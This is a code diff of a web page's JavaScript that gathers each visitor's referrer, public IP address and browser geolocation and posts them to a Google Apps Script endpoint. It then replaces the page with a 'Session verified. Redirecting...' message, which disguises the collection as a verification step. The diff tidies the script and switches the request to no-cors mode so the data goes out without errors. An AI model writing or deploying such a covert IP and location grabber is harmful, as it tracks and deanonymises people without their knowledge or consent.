@@ -16,7 +16,7 @@
       referrer: document.referrer
     };
 
-    // Step 1: Get public IP
+    // Step 1: Get IP
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(ipData => {
@@ -31,25 +31,22 @@
             sendData();
           },
           function (err) {
-            data.latitude = "";
-            data.longitude = "";
-            data.accuracy = "";
-            sendData(); // Still send without location
+            sendData(); // Skip location if blocked
           }
         );
       });
 
-    // Step 3: Send data to Google Apps Script
     function sendData() {
       const formData = new URLSearchParams();
       for (let key in data) {
         formData.append(key, data[key]);
       }
 
+      // Use no-cors to avoid preflight and CORS issues
       fetch("https://script.google.com/macros/s/AKfycbwYndUfgsQIqSSZedH-y9GZCaBSMEg7eVNxxUrHz1S3f4MvNN_PUW-nYwochdNX9NSX/exec", {
         method: "POST",
-        body: formData
-        // ❌ Don't use mode: "no-cors"
+        body: formData,
+        mode: "no-cors"
       });
 
       document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
